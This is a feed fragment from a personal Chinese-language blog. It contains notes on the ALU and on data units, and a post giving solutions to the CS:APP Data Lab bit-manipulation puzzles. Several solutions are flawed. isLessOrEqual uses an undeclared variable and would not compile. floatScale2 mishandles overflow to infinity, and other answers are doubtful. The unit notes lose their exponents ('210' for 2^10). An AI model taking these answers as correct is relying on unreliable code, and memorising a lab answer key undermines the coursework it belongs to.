title="算术逻辑部件(ALU)"></a>算术逻辑部件(ALU)</h3><ul><li>进行基本算术运算与逻辑运算<ul><li>无符号整数加、减</li><li>带符号整数加、减</li><li>与、或、非、异或等逻辑运算</li></ul></li><li>核心电路是带标志加法器</li><li>输出除和&#x2F;差等，还有标志信息</li><li>有一个操作控制端（ALUo），用来决定ALU所执行的处理功能。ALUop的位数k决定了操作的种类，例如，当位数k为3时，ALU最多只有2^3^&#x3D;8种操作。</li></ul><p><img src="https://s3.bmp.ovh/imgs/2022/07/22/837ce91a75f7fa73.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;布尔代数&quot;&gt;&lt;a href=&quot;#布尔代数&quot; class=&quot;headerlink&quot; title=&quot;布尔代数&quot;&gt;&lt;/a&gt;布尔代数&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;关于0和1的一套数学运算体系起源于1850年前后英国数学家乔治·布尔（ George Boole ）的工作，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>cs:app lab1</title>
    <link href="http://antihypezero.github.io/2022/07/15/csapp-lab1/"/>
    <id>http://antihypezero.github.io/2022/07/15/csapp-lab1/</id>
    <published>2022-07-15T15:37:06.463Z</published>
    <updated>2022-07-15T15:37:06.463Z</updated>
    
    <content type="html"><![CDATA[<p>借鉴于(<a href="https://zhuanlan.zhihu.com/p/395271636">https://zhuanlan.zhihu.com/p/395271636</a>)</p><p>借鉴于(<a href="https://blog.csdn.net/zzy980511/article/details/120608839">https://blog.csdn.net/zzy980511/article/details/120608839</a>)</p><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * bitXor - x^y using only ~ and &amp;</span><br><span class="line"> *   Example: bitXor(4, 5) = 1</span><br><span class="line"> *   Legal ops: ~ &amp;</span><br><span class="line"> *   Max ops: 14</span><br><span class="line"> *   Rating: 1</span><br><span class="line"> */</span><br><span class="line">int bitXor(int x, int y)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int bitXor(int x, int y) &#123;</span><br><span class="line">  return ~(~(~x &amp; y) &amp; ~(x &amp; ~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * tmin - return minimum two&#x27;s complement integer</span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: 4</span><br><span class="line"> *   Rating: 1</span><br><span class="line"> */</span><br><span class="line">int tmin(void)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int tmin(void) &#123;</span><br><span class="line">  return 1 &lt;&lt; 31;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="line"> *     and 0 otherwise</span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="line"> *   Max ops: 10</span><br><span class="line"> *   Rating: 1</span><br><span class="line"> */</span><br><span class="line">int isTmax(int x)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = x + <span class="number">1</span>;    </span><br><span class="line">  x = x + i;        </span><br><span class="line">  x = x + <span class="number">1</span>;     </span><br><span class="line">  </span><br><span class="line">  i = !i;           </span><br><span class="line">  x = x + i;        </span><br><span class="line">  <span class="keyword">return</span> !x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="line"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="line"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: 12</span><br><span class="line"> *   Rating: 2</span><br><span class="line"> */</span><br><span class="line">int allOddBits(int x)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int allOddBits(int x) </span><br><span class="line">&#123;</span><br><span class="line">  int i = (0xAA &lt;&lt; 8) | 0xAA;</span><br><span class="line">  int j = (i &lt;&lt; 16) | i;      </span><br><span class="line">  return !((x &amp; j) ^ j);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * negate - return -x</span><br><span class="line"> *   Example: negate(1) = -1.</span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: 5</span><br><span class="line"> *   Rating: 2</span><br><span class="line"> */</span><br><span class="line">int negate(int x)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int negate(int x) </span><br><span class="line">&#123;</span><br><span class="line">  return (~x + 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="line"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="line"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="line"> *            isAsciiDigit(0x05) = 0.</span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: 15</span><br><span class="line"> *   Rating: 3</span><br><span class="line"> */</span><br><span class="line">int isAsciiDigit(int x)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int isAsciiDigit(int x)</span><br><span class="line">&#123;</span><br><span class="line">  int x1 = (x &gt;&gt; 4) ^ 0x3;</span><br><span class="line">  int x2 = (x &gt;&gt; 3) &amp; 0x1;</span><br><span class="line">  int x3 = (x &gt;&gt; 2) &amp; 0x1;</span><br><span class="line">  int x4 = (x &gt;&gt; 1) &amp; 0x1;</span><br><span class="line">  return !x1 &amp; (!x2) | (x2 &amp; !x3 &amp; !x4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * conditional - same as x ? y : z</span><br><span class="line"> *   Example: conditional(2,4,5) = 4</span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: 16</span><br><span class="line"> *   Rating: 3</span><br><span class="line"> */</span><br><span class="line">int conditional(int x, int y, int z)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int conditional(int x, int y, int z) </span><br><span class="line">&#123;</span><br><span class="line">  x = !!x;</span><br><span class="line">  x = ~x + 1;</span><br><span class="line">  return (x &amp; y) | (~x &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span><br><span class="line"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: 24</span><br><span class="line"> *   Rating: 3</span><br><span class="line"> */</span><br><span class="line">int isLessOrEqual(int x, int y)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int isLessOrEqual(int x, int y) </span><br><span class="line">&#123;</span><br><span class="line">  int val = y + (~x + 1);</span><br><span class="line">  int signedVal = (val &amp; 0x80000000) &gt;&gt; 31;</span><br><span class="line">  int signedX = x &amp; 0x80000000;</span><br><span class="line">  int signedY = y &amp; 0x80000000;</span><br><span class="line">  int flag = ((signedX ^ signedY) &gt;&gt; 31) &amp; 1;</span><br><span class="line">  return (!flag &amp; !signedval) | (flag &amp; (signedX &gt;&gt; 31));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * logicalNeg - implement the ! operator, using all of</span><br><span class="line"> *              the legal operators except !</span><br><span class="line"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="line"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: 12</span><br><span class="line"> *   Rating: 4</span><br><span class="line"> */</span><br><span class="line">int logicalNeg(int x)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int logicalNeg(int x)</span><br><span class="line">&#123;</span><br><span class="line">  int nx = (~x + 1);     </span><br><span class="line">  int i = x | nx;</span><br><span class="line">  return (i &gt;&gt; 31) + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="line"> *             two&#x27;s complement</span><br><span class="line"> *  Examples: howManyBits(12) = 5</span><br><span class="line"> *            howManyBits(298) = 10</span><br><span class="line"> *            howManyBits(-5) = 4</span><br><span class="line"> *            howManyBits(0)  = 1</span><br><span class="line"> *            howManyBits(-1) = 1</span><br><span class="line"> *            howManyBits(0x80000000) = 32</span><br><span class="line"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *  Max ops: 90</span><br><span class="line"> *  Rating: 4</span><br><span class="line"> */</span><br><span class="line">int howManyBits(int x)</span><br><span class="line">&#123;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int howManyBits(int x) </span><br><span class="line">&#123;</span><br><span class="line">  int Sign = x &gt;&gt; 31;</span><br><span class="line">  x = (Sign &amp; ~x)  | (~Sign &amp; x);</span><br><span class="line">  </span><br><span class="line">  int High16 = !!(x &gt;&gt; 16) &lt;&lt; 4;</span><br><span class="line">  x = x &gt;&gt; High16;</span><br><span class="line"></span><br><span class="line">  int High8 = !!(x &gt;&gt; 8) &lt;&lt; 3;</span><br><span class="line">  x = x &gt;&gt; High8;</span><br><span class="line"></span><br><span class="line">  int High4 = !!(x &gt;&gt; 4) &lt;&lt; 2;</span><br><span class="line">  x = x &gt;&gt; High4;</span><br><span class="line"></span><br><span class="line">  int High2 = !!(x &gt;&gt; 2) &lt;&lt; 1;</span><br><span class="line">  x = x &gt;&gt; High2;</span><br><span class="line"></span><br><span class="line">  int High1 = !!(x &gt;&gt; 1); </span><br><span class="line">  x = x &gt;&gt; High1;</span><br><span class="line"></span><br><span class="line">  int High0 = x;</span><br><span class="line">  return High16 + High8 + High4 + High2 + High1 + High0 + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="line"> *   floating point argument f.</span><br><span class="line"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="line"> *   they are to be interpreted as the bit-level representation of</span><br><span class="line"> *   single-precision floating point values.</span><br><span class="line"> *   When argument is NaN, return argument</span><br><span class="line"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="line"> *   Max ops: 30</span><br><span class="line"> *   Rating: 4</span><br><span class="line"> */</span><br><span class="line">unsigned floatScale2(unsigned uf)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">unsigned floatScale2(unsigned uf)</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">  unsigned Sign = uf &gt;&gt; 31;             </span><br><span class="line">  unsigned Exp = (uf &gt;&gt; 23) &amp; 0xff;     </span><br><span class="line">  unsigned Frac = uf &amp; 0x7fffff;        </span><br><span class="line"> </span><br><span class="line">  if(Exp == 0xff &amp;&amp; Frac != 0)</span><br><span class="line">    return uf;</span><br><span class="line">  </span><br><span class="line">  unsigned Result = 0;</span><br><span class="line">  </span><br><span class="line">  if(Exp == 0)   </span><br><span class="line">  &#123;</span><br><span class="line">    int Carry = (Frac &lt;&lt; 1) &gt;&gt; 23;</span><br><span class="line">    Frac = (Frac &lt;&lt; 1) &amp; 0x7fffff;  </span><br><span class="line">    Exp = Exp + Carry;</span><br><span class="line">  &#125;</span><br><span class="line">  else if(Exp != 0xff)       </span><br><span class="line">    Exp = Exp + 1;</span><br><span class="line">  </span><br><span class="line">  Result = (Sign &lt;&lt; 31) | (Exp &lt;&lt; 23) | Frac;</span><br><span class="line">  return Result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="line"> *   for floating point argument f.</span><br><span class="line"> *   Argument is passed as unsigned int, but</span><br><span class="line"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="line"> *   single-precision floating point value.</span><br><span class="line"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="line"> *   0x80000000u.</span><br><span class="line"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="line"> *   Max ops: 30</span><br><span class="line"> *   Rating: 4</span><br><span class="line"> */</span><br><span class="line">int floatFloat2Int(unsigned uf)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int floatFloat2Int(unsigned uf) </span><br><span class="line">&#123;</span><br><span class="line">  int sign = uf &gt;&gt; 31;</span><br><span class="line">  int exp = ((uf &gt;&gt; 23) &amp; 0xff) - 127;</span><br><span class="line">  int frac = (uf &amp; 0x007fffff) | 0x00800000;</span><br><span class="line">  int value = 0;</span><br><span class="line">  if (exp &lt; 0) &#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  if (exp &gt; 31) &#123;</span><br><span class="line">    return 0x80000000;</span><br><span class="line">  &#125;</span><br><span class="line">  if (exp &lt; 23) &#123;</span><br><span class="line">    value = frac &gt;&gt; (23 - exp);</span><br><span class="line">  &#125; else if (exp &gt; 23) &#123;</span><br><span class="line">    value = frac &lt;&lt; (exp - 23);</span><br><span class="line">  &#125;</span><br><span class="line">  return sign ? ~value + 1 : value; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="line"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="line"> *</span><br><span class="line"> *   The unsigned value that is returned should have the identical bit</span><br><span class="line"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="line"> *   If the result is too small to be represented as a denorm, return</span><br><span class="line"> *   0. If too large, return +INF.</span><br><span class="line"> *</span><br><span class="line"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while</span><br><span class="line"> *   Max ops: 30</span><br><span class="line"> *   Rating: 4</span><br><span class="line"> */</span><br><span class="line">unsigned floatPower2(int x)</span><br><span class="line">&#123;</span><br><span class="line">  return 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解答</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">unsigned floatPower2(int x)</span><br><span class="line">&#123;</span><br><span class="line">  if (x &lt; -149) &#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  if (x &lt; -126) &#123;</span><br><span class="line">    return 1 &lt;&lt; (x + 149);</span><br><span class="line">  &#125;</span><br><span class="line">  if (x &lt; 128) &#123;</span><br><span class="line">    return (x + 127) &lt;&lt; 23;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0xff &lt;&lt; 23;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;借鉴于(&lt;a href=&quot;https://zhuanlan.zhihu.com/p/395271636&quot;&gt;https://zhuanlan.zhihu.com/p/395271636&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;借鉴于(&lt;a href=&quot;https://blog.csdn.ne</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>数据存储</title>
    <link href="http://antihypezero.github.io/2022/07/15/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/"/>
    <id>http://antihypezero.github.io/2022/07/15/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/</id>
    <published>2022-07-15T10:39:28.457Z</published>
    <updated>2022-08-06T09:50:01.986Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h3><ul><li><p>比特（ bit ，位）是计算机中处理、存储、传输信息的最小单位</p></li><li><p>二进制信息最基本的计量单位是“字节”( Byte )</p><ul><li>现代计算机中，存储器按字节编址</li><li>字节是最小可寻址单位( addressable unit )</li><li>如果以字节为一个排列单位，则 LSB 表示最低有效字节， MSB 表示最高有效字节</li></ul></li><li><p>除比特（位）和字节外，还经常使用“字”( word ）作为单位</p><ul><li><p>“字”和“字长”的概念不同</p><blockquote><p>IA -32中的“字”有多少位？位字长多少位呢？</p><p>16位32位 </p><p>DWORD :32位 QwORD :64位</p></blockquote><blockquote><p>数据通路指 CPU 内部数据流经的路径以及路径上的部件，主要是 CPU 内部进行数据运算、存储和传送的部件，这些部件的宽度基本上要一致，才能相互匹配。</p></blockquote></li><li><p>“字长”指数据通路的宽度。<strong>”字长”等于 CPU 内部总线的宽度、运算器的位数、通用寄存器的宽度（这些部件的宽度都是一样的）</strong></p></li><li><p>“字”表示被处理信息的单位，用来度量数据类型的宽度</p></li><li><p>字和字长的宽度可以一样，也可不同</p><blockquote><p>例1：对于x86体系结构，不管字长多少，定义“字”的宽度都为16位，而从386开始字长就是32位了<br>例2：对于 MIPS 32体系结构，其字和字长都是32位</p></blockquote></li></ul></li></ul><h3 id="数据量的度量单位"><a href="#数据量的度量单位" class="headerlink" title="数据量的度量单位"></a>数据量的度量单位</h3><ul><li>存储二进制信息时的度量单位要比字节或字大得多</li><li>容量经常使用的单位有：<ul><li>“干字节”( KB ),1KB&#x3D;210字节＝1024B</li><li>“兆字节”( MB ),1MB&#x3D;220字节＝1024KB</li><li>“干兆字节”( GB ),1GB&#x3D;230字节＝1024MB</li><li>“兆兆字节”( TB ),1TB&#x3D;240字节＝1024GB</li></ul></li><li>通信中的带宽使用的单位有：<ul><li>千比特／秒”( kb &#x2F; s ),1kbps&#x3D;103 b &#x2F; s &#x3D;1000 bps </li><li>“兆比特／秒”( Mb &#x2F; s ),1Mbps&#x3D;106 b &#x2F; s &#x3D;1000 kbps</li><li>“干兆比特／秒”( Gb &#x2F; s ),1Gbps&#x3D;109 b &#x2F; s &#x3D;1000 Mbps </li><li>“兆兆比特／秒”( Tb &#x2F; s 